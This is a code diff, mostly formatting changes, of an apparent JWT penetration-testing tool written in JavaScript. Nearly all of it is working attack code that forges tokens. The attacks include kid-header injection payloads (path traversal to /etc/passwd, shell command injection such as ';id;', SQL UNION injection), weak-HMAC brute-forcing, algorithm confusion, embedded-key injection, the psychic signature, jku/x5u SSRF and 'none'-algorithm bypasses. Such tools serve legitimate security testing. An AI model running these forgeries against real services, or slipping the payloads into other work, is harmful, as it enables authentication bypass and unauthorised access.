+async function attackKid(token, useDefaultPayloadList = true, useCustomPayloadlist = false, customPayloadList = []) {
     // Sanity checks
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attackKid: invalid token")
         return [];
     }
-    if (useCustomPayloadlist){
-        if (customPayloadList.length === 0){
+    if (useCustomPayloadlist) {
+        if (customPayloadList.length === 0) {
             jwt_attacks_error_message("attackKid: custom payload list is empty")
             return [];
         }
     }
 
-
     const [header, body, valid_signature] = token.split(".");
     const alg = JSON.parse(b64URLdecode(header)).alg;
-    
+
     //* payloads        |               kidPayloads                 | key
     // 1. ../../../../../../../../../../../../etc/passwd    | undefined -> use default signature/key
     // 2. ../../../../../../../../../../../../dev/null      | empty key -> use attackEmptyKey
@@ -2656,31 +2640,30 @@ async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadli
     // 9. 1234' UNION SELECT 'aaaa                          | "aaaa"
 
     const payloadListWithKeys = [
-        {payload: "../../../../../../../../../../../../etc/passwd", key: undefined}, // 1
-        {payload: "../../../../../../../../../../../../dev/null", key: "\0"}, // 2
-        {payload: ";id;", key: undefined}, // 3
-        {payload: "&id&", key: undefined}, // 4
-        {payload: "|| id ||", key: undefined}, // 5
-        {payload: ";ping -c 10 127.0.0.1;", key: undefined}, // 6
-        {payload: "&ping -c 10 127.0.0.1&", key: undefined}, // 7
-        {payload: "||ping -c 10 127.0.0.1||", key: undefined}, // 8 
-        {payload: "1234' UNION SELECT 'aaaa", key: btoa("aaaa")} // 9
-        
+        { payload: "../../../../../../../../../../../../etc/passwd", key: undefined }, // 1
+        { payload: "../../../../../../../../../../../../dev/null", key: "\0" }, // 2
+        { payload: ";id;", key: undefined }, // 3
+        { payload: "&id&", key: undefined }, // 4
+        { payload: "|| id ||", key: undefined }, // 5
+        { payload: ";ping -c 10 127.0.0.1;", key: undefined }, // 6
+        { payload: "&ping -c 10 127.0.0.1&", key: undefined }, // 7
+        { payload: "||ping -c 10 127.0.0.1||", key: undefined }, // 8
+        { payload: "1234' UNION SELECT 'aaaa", key: btoa("aaaa") } // 9
+
     ]
-    if (useCustomPayloadlist){
+    if (useCustomPayloadlist) {
         payloadListWithKeys.push(...customPayloadList)
     }
     let testCases = [];
-    for (const {payload, key} of payloadListWithKeys){
+    for (const { payload, key } of payloadListWithKeys) {
         let parsedHeader = JSON.parse(b64URLdecode(header));
         parsedHeader.kid = payload; // set the kid to the payload
-        
-        
-        if (key === undefined){
+
+        if (key === undefined) {
             // use the default signature/key
             const header_with_kid = unescapeCustomJsonKeys(JSON.stringify(parsedHeader));
             const testToken = `${b64URLencode(header_with_kid)}.${body}.${valid_signature}`;
-            console.debug("Test Token:",testToken);
+            console.debug("Test Token:", testToken);
             testCases.push(new TestCase({
                 description: "Kid Attack - no Key",
                 variantName: `Kid: ${payload}`,
@@ -2697,7 +2680,7 @@ async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadli
 
             const signature = await signHS(b64URLencode(header_with_kid), body, "HS256", "\0"); // empty key
             const testToken = `${b64URLencode(header_with_kid)}.${body}.${signature}`;
-            console.debug("Test Token:",testToken);
+            console.debug("Test Token:", testToken);
             testCases.push(new TestCase({
                 description: "Kid Attack with Empty Key",
                 variantName: `Kid: ${payload}`,
@@ -2711,9 +2694,9 @@ async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadli
         else { // use the key to sign the token
             parsedHeader.alg = "HS256"
             const header_with_kid = unescapeCustomJsonKeys(JSON.stringify(parsedHeader));
-            const signature = await signHS(b64URLencode(header_with_kid), body, "HS256", key,keyIsBase64=true); // custom key
+            const signature = await signHS(b64URLencode(header_with_kid), body, "HS256", key, keyIsBase64 = true); // custom key
             const testToken = `${b64URLencode(header_with_kid)}.${body}.${signature}`;
-            console.debug("Test Token:",testToken);
+            console.debug("Test Token:", testToken);
             testCases.push(new TestCase({
                 description: "Kid Attack with Custom Key",
                 variantName: `Kid: ${payload} \n Key: ${key}`,
@@ -2723,7 +2706,7 @@ async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadli
                 testReadable: header_with_kid,
                 vulnerability: vulnerabilities.Kid
             }))
-        } 
+        }
     }
     return testCases;
 
@@ -2735,7 +2718,7 @@ async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadli
  * @param {string} token - JWT token (HSxxx algorithm)
  * @return {Promise<TestCase|[]>} test case object or an empty array if no key was found / error occurred
  */
-async function attackWeakHMACKey(token){
+async function attackWeakHMACKey(token) {
     // Bruteforcing the HMAC key with a list of default secrets https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
     // On my Laptop it took around 5 seconds to bruteforce the whole list (100000 keys)
     // Todo: add a hashcat/john command so that the user can bruteforce faster
@@ -2747,7 +2730,7 @@ async function attackWeakHMACKey(token){
     }
     const [header, body, valid_signature] = token.split(".");
     const alg = JSON.parse(b64URLdecode(header)).alg;
-    if (!valid_signature){
+    if (!valid_signature) {
         jwt_attacks_error_message("attackWeakHMACKey: invalid token, no signature")
         return [];
     }
@@ -2760,15 +2743,14 @@ async function attackWeakHMACKey(token){
     const secrets = await fetch('jwt.secrets.list')
         .then(response => response.text())
         .then(data => data.split('\n').map(secret => secret.replace(/\r$/, '')).filter(secret => secret.trim() !== ''));
-        
 
     // try to verify the token with each secret
-    for (let key of secrets){
+    for (let key of secrets) {
         if (await crypto.subtle.verify('HMAC', await crypto.subtle.importKey('raw', new TextEncoder().encode(String(key)), { name: "HMAC", hash: _alg_converter[alg] }, false, ["verify"]), base64urlToUint8Array(valid_signature), new TextEncoder().encode(header + "." + body))) {
-            // ^ Unnecessary complicated but a working verify oneliner 
-            
+            // ^ Unnecessary complicated but a working verify oneliner
+
             // Verification succeeded, we found a weak key
-            console.info("Weak HMAC Key found",key);
+            console.info("Weak HMAC Key found", key);
             document.getElementById("weakHMAC-result").innerText = "Weak HMAC Key found: " + key;
             return new TestCase({
                 description: "Weak HMAC Key Attack",
@@ -2789,8 +2771,8 @@ async function attackWeakHMACKey(token){
  * @param {string} token JWT token
  * @return {Promise<TestCase[]>} array of test cases with the generated tokens
  */
-async function attackEmptyKey(token){
-    // Signing the token via HSxxx with a empty key \x00 / AA== 
+async function attackEmptyKey(token) {
+    // Signing the token via HSxxx with a empty key \x00 / AA==
     // https://redfoxsec.com/blog/jwt-deep-dive-into-algorithm-confusion/
 
     if (!(isValidJWT(token))) {
@@ -2799,17 +2781,17 @@ async function attackEmptyKey(token){
     }
     const [header, body, _] = token.split(".")
     const header_parsed = JSON.parse(b64URLdecode(header));
-    const algs = ["HS256","HS384","HS512"];
+    const algs = ["HS256", "HS384", "HS512"];
     const test_cases = [];
     // pretty straight forward, just sign the token with an empty key and the algs
     // add a Test Case for each alg
-    for (let alg of algs){
+    for (let alg of algs) {
         var header_with_custom_key = JSON.parse(b64URLdecode(header));
         header_with_custom_key.alg = alg;
         // header_with_custom_key.typ = "JWT"; // set it again just to be double safe.
         // remove ESCAPE_SEQUENCE from the header
         const header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))
-        var signature = await signHS(b64URLencode(header_with_duplicates),body,alg,"\0"); // empty key
+        var signature = await signHS(b64URLencode(header_with_duplicates), body, alg, "\0"); // empty key
         test_cases.push(new TestCase({
             description: "Empty Key Attack",
             variantName: `Empty Key Attack ${alg}`,
@@ -2837,22 +2819,21 @@ async function attackEmptyKey(token){
  * @param {boolean} [setTypHeader=false] set the header.typ = "JWT"
  * @return {Promise<TestCase[]|[]>} array of test cases with the generated tokens or empty array if an error occurs
  */
-async function attackKeyConfusion(token, algOutput, key, setTypHeader=false){
+async function attackKeyConfusion(token, algOutput, key, setTypHeader = false) {
     // https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion SOLVED ✓
     // Solvable with RS256 -> HS256 if the PEM gets base64 encoded to preserve NEWLINES and then decoded and used as ascii key
 
-    
     // PKCS1: RSA, PCKS8: RSA, EC; JWK: RSA,EC; DER: RSA, EC; x509: RSA, EC;
     // Sanity checks
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attackKeyConfusion: invalid token")
         return [];
     }
-    if (typeof algOutput !== "string" || !/HS(?:256|384|512)/.test(algOutput)){
+    if (typeof algOutput !== "string" || !/HS(?:256|384|512)/.test(algOutput)) {
         jwt_attacks_error_message("attackKeyConfusion: invalid algOutput")
         return [];
     }
-    if (!key || typeof key !== "string"){
+    if (!key || typeof key !== "string") {
         jwt_attacks_error_message("attackKeyConfusion: key is not a string")
         return [];
     }
@@ -2861,33 +2842,33 @@ async function attackKeyConfusion(token, algOutput, key, setTypHeader=false){
     const [header, body, _] = token.split(".")
     const algInput = JSON.parse(b64URLdecode(header)).alg;
     // Check if the key is a JWK
-    if (key.startsWith("{") && key.endsWith("}")){
+    if (key.startsWith("{") && key.endsWith("}")) {
         parsedKey = JSON.parse(key);
         pem = await jwkToSpkiPem(parsedKey, algInput);
-        console.debug("Key Confusion: key is a JWK, converted to PEM",key);
+        console.debug("Key Confusion: key is a JWK, converted to PEM", key);
     }
-    else if (key.startsWith("-----BEGIN") && key.match(/-----\n?$/)){
+    else if (key.startsWith("-----BEGIN") && key.match(/-----\n?$/)) {
         pem = key
         parsedKey = await pemToJwk(pem);
     }
-    else{
-        jwt_attacks_error_message("Key Confusion: key is not a PEM or JWK",key); // get it? :P
+    else {
+        jwt_attacks_error_message("Key Confusion: key is not a PEM or JWK", key); // get it? :P
         return [];
     }
-    console.debug("Key Confusion: key as base64",pem);
+    console.debug("Key Confusion: key as base64", pem);
     // Since the PEM input may contain newlines or may not contain newlines
     // we need to unify the format to base64 encoded key with newlines
     pem = pem.replace(/-----(BEGIN|END) [A-Z ]+-----/g, "").replace(/\s+/g, "");
     pem = pem.match(/.{1,64}/g).join("\n");
     pem = `-----BEGIN PUBLIC KEY-----\n${pem}\n-----END PUBLIC KEY-----`;
-    console.debug("Key Confusion: PEM key with newlines",pem);
+    console.debug("Key Confusion: PEM key with newlines", pem);
 
-    //*      Testcases 
+    //*      Testcases
     // The following test cases will be encoded as: key = ASCII(TESTCASE)
     // Tests with the base64 flag will be also encoded as: key = BASE64(TESTCASE)
 
     // 1.   PEM encoded key (base64) with header, footer, newlines, No newline at the end
-    // 2.   PEM encoded key (base64) with header, footer, newlines, with newline at the end (Works for the portswigger lab) 
+    // 2.   PEM encoded key (base64) with header, footer, newlines, with newline at the end (Works for the portswigger lab)
     // 3.   PEM encoded key (base64) with header, footer without newlines
     // 4.   PEM encoded key (base64) without header, footer with newlines
     // 5.   PEM encoded key (base64) without header, footer, newlines (+BASE64)
@@ -2897,122 +2878,122 @@ async function attackKeyConfusion(token, algOutput, key, setTypHeader=false){
     // 9.   Take x and use it as key (+BASE64)
     // 10.  Take y and use it as key (+BASE64)
 
-    // Test case 1-6 
+    // Test case 1-6
     const keyFormatVariants = [
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) with header, footer, newlines, No newline at the end",
             key: pem,
             base64Testable: false
         },
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) with header, footer, newlines, with newline at the end",
             key: pem + '\n',
             base64Testable: false
         },
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) with header, footer without newlines",
             key: pem.replace(/\n/g, ""),
             base64Testable: false
         },
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) without header, footer with newlines",
             key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, ""),
             base64Testable: false
         },
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) without header, footer, newlines",
             key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, ""),
             base64Testable: false
         },
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) without header, footer, newlines, with newlines at the end",
             key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, "") + '\n',
             base64Testable: false
         }
     ];
     // Test case 7-10
-    if (parsedKey){
-        if (parsedKey.kty === "RSA"){
+    if (parsedKey) {
+        if (parsedKey.kty === "RSA") {
             keyFormatVariants.push(
-            { 
-                VariantDescription: "Take e and use it as key",
-                key: parsedKey.e,
-                base64Testable: false                
-            },
-            { 
-                VariantDescription: "Take n and use it as key",
-                key: parsedKey.n,
-                base64Testable: false
-            })
+                {
+                    VariantDescription: "Take e and use it as key",
+                    key: parsedKey.e,
+                    base64Testable: false
+                },
+                {
+                    VariantDescription: "Take n and use it as key",
+                    key: parsedKey.n,
+                    base64Testable: false
+                })
         }
-        else if (parsedKey.kty === "EC"){
+        else if (parsedKey.kty === "EC") {
             keyFormatVariants.push(
-            { 
-                VariantDescription: "Take x and use it as key",
-                key: parsedKey.x,
-                base64Testable: false
-            },
-            { 
-                VariantDescription: "Take y and use it as key",
-                key: parsedKey.y,
-                base64Testable: false
-            })
+                {
+                    VariantDescription: "Take x and use it as key",
+                    key: parsedKey.x,
+                    base64Testable: false
+                },
+                {
+                    VariantDescription: "Take y and use it as key",
+                    key: parsedKey.y,
+                    base64Testable: false
+                })
         }
     }
     // repeat testcases with base64 encoded key
     // Test case 11 (repitition of 5)
     keyFormatVariants.push(
-        { 
+        {
             VariantDescription: "PEM encoded key (base64) without header, footer, newlines",
             key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, ""),
             base64Testable: true
         })
     // Test cases 12-15 (repitition of 7-10)
-    if (parsedKey){
-        if (parsedKey.kty === "RSA"){
+    if (parsedKey) {
+        if (parsedKey.kty === "RSA") {
             keyFormatVariants.push(
-            { 
-                VariantDescription: "Take e and use it as key",
-                key: URL_to_base64(parsedKey.e),
-                base64Testable: true                
-            },
-            { 
-                VariantDescription: "Take n and use it as key",
-                key: URL_to_base64(parsedKey.n),
-                base64Testable: true
-            })
+                {
+                    VariantDescription: "Take e and use it as key",
+                    key: URL_to_base64(parsedKey.e),
+                    base64Testable: true
+                },
+                {
+                    VariantDescription: "Take n and use it as key",
+                    key: URL_to_base64(parsedKey.n),
+                    base64Testable: true
+                })
         }
-        else if (parsedKey.kty === "EC"){
+        else if (parsedKey.kty === "EC") {
             keyFormatVariants.push(
-            { 
-                VariantDescription: "Take x and use it as key",
-                key: URL_to_base64(parsedKey.x),
-                base64Testable: true
-            },
-            { 
-                VariantDescription: "Take y and use it as key",
-                key: URL_to_base64(parsedKey.y),
-                base64Testable: true
-            })
+                {
+                    VariantDescription: "Take x and use it as key",
+                    key: URL_to_base64(parsedKey.x),
+                    base64Testable: true
+                },
+                {
+                    VariantDescription: "Take y and use it as key",
+                    key: URL_to_base64(parsedKey.y),
+                    base64Testable: true
+                })
         }
     }
 
     let test_cases = [];
     // Sign the token with every key format in keyFormatVariants
     // Change the alg to HSxxx and set the typ header to JWT
-    for (let k of keyFormatVariants){
+    for (let k of keyFormatVariants) {
 
-        console.debug("Key Confusion: key format variant",k.VariantDescription);
-        console.debug("Key Confusion: key format variant key",k.key);
+        console.debug("Key Confusion: key format variant", k.VariantDescription);
+        console.debug("Key Confusion: key format variant key", k.key);
         // RSxxx -> HSxxx
         var header_with_custom_key = JSON.parse(b64URLdecode(header));
         header_with_custom_key.alg = algOutput;
         if (setTypHeader) header_with_custom_key.typ = "JWT"; // set it again just to be double safe. It is not set in the original token in the portswigger lab but needed for the solution
-        
+
         // remove ESCAPE_SEQUENCE from the header
         const header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))
-        var signature = await signHS(b64URLencode(header_with_duplicates),body,algOutput,k.key,k.base64Testable);
-    
+        var signature = await signHS(b64URLencode(header_with_duplicates), body, algOutput, k.key, k.base64Testable);
+
         test_cases.push(new TestCase({
             description: "Key Confusion Attack / Algorithm Confusion",
             variantName: `${algInput} -> ${algOutput}: ${k.VariantDescription}${k.base64Testable ? " (BASE64)" : ""}`,
@@ -3024,7 +3005,7 @@ async function attackKeyConfusion(token, algOutput, key, setTypHeader=false){
         }))
         console.debug(`${b64URLencode(header_with_duplicates)}.${body}.${signature}`)
     }
-    
+
     return test_cases
 
 }
@@ -3036,24 +3017,24 @@ async function attackKeyConfusion(token, algOutput, key, setTypHeader=false){
  * Otherwise a default key will be used.
  * If addCustomKeyViaURL is true, the jku/x5u header will be set to the URL provided. And the token will be signed with the first key.
  * The function will return 4 additional tokens then.
- * 
+ *
  *
  * @param {string} token JWT token
  * @param {string} alg - algorithm to use (e.g., RS256)
  * @param {object} [key=undefined] JWK key as object
  * @param {boolean} [addCustomKeyViaURL=true] if true, set jku/x5u to URL
- * @param {string} [URL] URL to the JWK Set or Public Key (x5u) to be used in the header  
+ * @param {string} [URL] URL to the JWK Set or Public Key (x5u) to be used in the header
  * @param {boolean} [setTypHeader=false] set header.typ = "JWT"
  * @return {Promise<TestCase[]>}
  */
-async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = true, URL, setTypHeader=false){
+async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL = true, URL, setTypHeader = false) {
     // https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection SOLVED ✓
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attackCustomKey: invalid token")
-        return 
+        return
     }
     const [header, body, _] = token.split(".")
-    if (alg.startsWith("RS")){
+    if (alg.startsWith("RS")) {
         if (!key) key = {
             "kty": "RSA",
             "alg": alg,
@@ -3068,25 +3049,25 @@ async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = tr
             "qi": "WOY8SOGUOTFIiQxu8OL5XBMj2vrYHPD2a3H2Vmr4_iIQt9nLNCUn-gbD_XqE9091fGI-UqFGFdm-FoqlY5c7AW4GLvrFrOlGg8uCadAx8zE5eN5f3tCxZY3hJdXWjAZ9F1YxES0ycnjzxszasHXwdWOL0cQHxlx25eEVv5ir6gE"
         }
     }
-    else if (alg.startsWith("HS")){
+    else if (alg.startsWith("HS")) {
         if (!key) key = {
             "kty": "oct",
             "k": "YellowSubmarine",
             "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83"
         }
     }
-    else if (alg.startsWith("ES")){
+    else if (alg.startsWith("ES")) {
         if (!key) key = {
-            "alg": alg, 
+            "alg": alg,
             "crv": "P-256",
-            "d": "OBME3fhzbjqqymJ0jbRvmuf5-vTgIavDChAat7TOHy8", 
+            "d": "OBME3fhzbjqqymJ0jbRvmuf5-vTgIavDChAat7TOHy8",
             "ext": true,
             "kty": "EC",
             "x": "m21lUaAZ3fn_iqsqP6i3Rbq6km99KH1JjxBawGlP8-I",
             "y": "m6OANLySoEJJqEhO7m8Z4WrhrJ4r6WY4SNRJLux6748"
         }
     }
-    else if (alg.startsWith("PS")){
+    else if (alg.startsWith("PS")) {
         if (!key) key = {
             "kty": "RSA",
             "alg": alg,
@@ -3101,7 +3082,7 @@ async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = tr
             "qi": "WOY8SOGUOTFIiQxu8OL5XBMj2vrYHPD2a3H2Vmr4_iIQt9nLNCUn-gbD_XqE9091fGI-UqFGFdm-FoqlY5c7AW4GLvrFrOlGg8uCadAx8zE5eN5f3tCxZY3hJdXWjAZ9F1YxES0ycnjzxszasHXwdWOL0cQHxlx25eEVv5ir6gE"
         }
     }
-    else{
+    else {
         jwt_attacks_error_message("attackCustomKey: invalid alg, only RS256, HSxxx, PSxxx and ESxxx supported")
         return [];
     }
@@ -3109,26 +3090,26 @@ async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = tr
     header_with_custom_key.jwk = extractPublicJwk(key);
     header_with_custom_key.alg = alg;
     header_with_custom_key.kid = key.kid;
-    if (setTypHeader) header_with_custom_key.typ = "JWT"; // set it again just to be double safe. It is not set in the original token in the portswigger lab but needed for the solution 
-    
+    if (setTypHeader) header_with_custom_key.typ = "JWT"; // set it again just to be double safe. It is not set in the original token in the portswigger lab but needed for the solution
+
     // remove ESCAPE_SEQUENCE from the header
     let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))
 
-    if (alg.startsWith("RS")){
-        var signature = await signRS(b64URLencode(header_with_duplicates),body,alg,JSON.stringify(key));
+    if (alg.startsWith("RS")) {
+        var signature = await signRS(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
     }
-    else if (alg.startsWith("HS")){
-        var signature = await signHS(b64URLencode(header_with_duplicates),body,alg,key.k);
+    else if (alg.startsWith("HS")) {
+        var signature = await signHS(b64URLencode(header_with_duplicates), body, alg, key.k);
     }
-    else if (alg.startsWith("ES")){
-        var signature = await signES(b64URLencode(header_with_duplicates),body,alg,JSON.stringify(key));
+    else if (alg.startsWith("ES")) {
+        var signature = await signES(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
     }
-    else if (alg.startsWith("PS")){
-        var signature = await signPS(b64URLencode(header_with_duplicates),body,alg,JSON.stringify(key));
+    else if (alg.startsWith("PS")) {
+        var signature = await signPS(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
     }
     let test_cases = []
     let tmp = []
-    if (addCustomKeyViaURL && URL){
+    if (addCustomKeyViaURL && URL) {
         try {
             var url_key = (await fetchJwkFromUrl(URL))[0]; // always take the first key
 
@@ -3138,29 +3119,29 @@ async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = tr
         }
         if (!url_key) {
             jwt_attacks_error_message("attackCustomKey: no key found at URL", URL);
-            
+
         }
-        
+
         // Custom Key Injection via jku/x5u
         // We can just reuse the attack_SSRF function to generate the test cases
-        tmp = attack_SSRF(token, URL, isCalledFromCustomKey=true); 
-        for (let SSRF_token of tmp){
+        tmp = attack_SSRF(token, URL, isCalledFromCustomKey = true);
+        for (let SSRF_token of tmp) {
             SSRF_token.description = vulnerabilities.CustomKey.name
             SSRF_token.vulnerability = vulnerabilities.CustomKey
             header_with_duplicates = b64URLencode(unescapeCustomJsonKeys(b64URLdecode(SSRF_token.testToken.split(".")[0])));
             const body = SSRF_token.testToken.split(".")[1];
 
-            if (alg.startsWith("RS")){ 
-                var signature = await signRS(header_with_duplicates,body,alg,JSON.stringify(url_key));
+            if (alg.startsWith("RS")) {
+                var signature = await signRS(header_with_duplicates, body, alg, JSON.stringify(url_key));
             }
-            else if (alg.startsWith("HS")){
-                var signature = await signHS(header_with_duplicates,body,alg,url_key.k);
+            else if (alg.startsWith("HS")) {
+                var signature = await signHS(header_with_duplicates, body, alg, url_key.k);
             }
-            else if (alg.startsWith("ES")){
-                var signature = await signES(header_with_duplicates,body,alg,JSON.stringify(url_key));
+            else if (alg.startsWith("ES")) {
+                var signature = await signES(header_with_duplicates, body, alg, JSON.stringify(url_key));
             }
-            else if (alg.startsWith("PS")){
-                var signature = await signPS(header_with_duplicates,body,alg,JSON.stringify(url_key));
+            else if (alg.startsWith("PS")) {
+                var signature = await signPS(header_with_duplicates, body, alg, JSON.stringify(url_key));
             }
             SSRF_token.testToken = `${header_with_duplicates}.${body}.${signature}`;
             test_cases.push(SSRF_token)
@@ -3182,11 +3163,11 @@ async function attackCustomKey(token, alg, key=undefined,addCustomKeyViaURL = tr
  * Replaces the signature of the token with a psychic signature (MAYCAQACAQA).
  * Changes the alg to ES256.
  *
- * @param {string} token JWT token	
+ * @param {string} token JWT token
  * @return {TestCase | []} test case object with psychic signature or empty array if an error occurs
  * @description This attack works on some Java implementations of JWT, where the signature is not verified correctly.
  */
-function attackPsychicSignature(token){
+function attackPsychicSignature(token) {
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attackPsychicSignature: invalid token")
         return []
@@ -3194,7 +3175,7 @@ function attackPsychicSignature(token){
     // straight forward
     // just replace the signature with MAYCAQACAQA and change the alg to ES256
     const [header, body, signature] = token.split(".")
-    const psychicSignature = "MAYCAQACAQA"; // <=> mod 0 
+    const psychicSignature = "MAYCAQACAQA"; // <=> mod 0
     const header_json = JSON.parse(b64URLdecode(header));
     header_json.alg = "ES256";
 
@@ -3212,7 +3193,6 @@ function attackPsychicSignature(token){
     })
 }
 
-
 /**
  * Genrates tokens with SSRF vulnerabilities in the jku and x5u header fields.
  *
@@ -3220,7 +3200,7 @@ function attackPsychicSignature(token){
  * @param {string} [url="http://localhost:8080"] URL to be used in the jku/x5u fields
  * @return {TestCase[]|[]} array of test cases with the generated tokens or empty array if an error occurs
  */
-function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=false){
+function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey = false) {
     if (!isValidJWT(token)) {
         jwt_attacks_error_message("attack_SSRF: invalid token")
         return [];
@@ -3232,8 +3212,8 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
     // redundat to the function parameter, but since it is possible that the url is empty
     // an empty url would be used
     // I still leave the default value in the function parameter, since it is more readable
-    url = url ? url : "http://localhost:8080"; 
-    
+    url = url ? url : "http://localhost:8080";
+
     //* 4 Testcases: x5u/jku in header and x5u/jku in extra jwk in header
     // token generation is straight forward, just add jku/x5u = url to the header
     //1. jku in header
@@ -3241,12 +3221,12 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
     header_jku.jku = url;
 
     // remove ESCAPE_SEQUENCE from the header
-    let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku),isCalledFromCustomKey)
+    let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku), isCalledFromCustomKey)
 
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated jku in JWT header",
         variantName: 'via jku',
-        originalToken: token, 
+        originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
         testReadable: header_with_duplicates,
@@ -3258,12 +3238,12 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
     header_x5u.x5u = url;
 
     // remove ESCAPE_SEQUENCE from the header
-    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u),isCalledFromCustomKey)
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u), isCalledFromCustomKey)
 
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated x5u in JWT header",
         variantName: 'via x5u',
-        originalToken: token, 
+        originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
         testReadable: header_with_duplicates,
@@ -3272,22 +3252,22 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
     ))
 
     // 3. x5u in jwk
-    let header_x5u_jwk = JSON.parse(JSON.stringify(header_json_org),isCalledFromCustomKey); // apparently a deep copy
+    let header_x5u_jwk = JSON.parse(JSON.stringify(header_json_org), isCalledFromCustomKey); // apparently a deep copy
     header_x5u_jwk.jwk = {
         kty: "RSA",
         "e": "AQAB",
         "n": "vRDkI8bC7--s3rE6Tp-xwo7ACC_7RT7Ps2Q7YJUhTF4XmcNXDbBjsbXMaCMiE2e_UQGqQQQ_PLRVmwVp_k9bwQ",
-        kid: "1234",  
+        kid: "1234",
         x5u: url
     }
 
     // remove ESCAPE_SEQUENCE from the header
-    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u_jwk),isCalledFromCustomKey)
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u_jwk), isCalledFromCustomKey)
 
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated x5u in JWK in JWT header",
         variantName: 'JWK(x5u) - kty: RSA',
-        originalToken: token, 
+        originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
         testReadable: header_with_duplicates,
@@ -3300,26 +3280,23 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
         kty: "RSA",
         "e": "AQAB",
         "n": "vRDkI8bC7--s3rE6Tp-xwo7ACC_7RT7Ps2Q7YJUhTF4XmcNXDbBjsbXMaCMiE2e_UQGqQQQ_PLRVmwVp_k9bwQ",
-        kid: "1234",  
+        kid: "1234",
         jku: url
     }
 
     // remove ESCAPE_SEQUENCE from the header
-    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku_jwk),isCalledFromCustomKey)
-    
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku_jwk), isCalledFromCustomKey)
+
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated jku in JWK in JWT header",
         variantName: 'JWK(jku) - kty: RSA',
-        originalToken: token, 
+        originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
         testReadable: header_with_duplicates,
         vulnerability: vulnerabilities.SSRF
     }))
-
-
     return test_cases
-
 }
 
 /**
@@ -3328,7 +3305,7 @@ function attack_SSRF(token,url="http://localhost:8080",isCalledFromCustomKey=fal
  * @param {string} token JWT token
  * @return {TestCase|[]} test case object with token without signature or empty array if an error occurs
  */
-function attack_signature_exclusion(token){
+function attack_signature_exclusion(token) {
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attack_signature_exclusion: invalid token")
         return []
@@ -3351,13 +3328,13 @@ function attack_signature_exclusion(token){
 }
 
 /**
- * Attacks the JWT token by changing the alg to none. 
+ * Attacks the JWT token by changing the alg to none.
  * To bypass possible blacklists, the alg is changed to all possible case combinations of "none".
  *
  * @param {string} token JWT token
  * @return {TestCase[]|[]} array of test cases with the generated tokens or empty array if an error occurs
  */
-function attack_none_alg(token){
+function attack_none_alg(token) {
     if (!(isValidJWT(token))) {
         jwt_attacks_error_message("attack_none_alg: invalid token")
         return []
@@ -3365,10 +3342,10 @@ function attack_none_alg(token){
     const [header, body, _signature] = token.split(".")
     const header_json = JSON.parse(b64URLdecode(header))
     const token_output = []
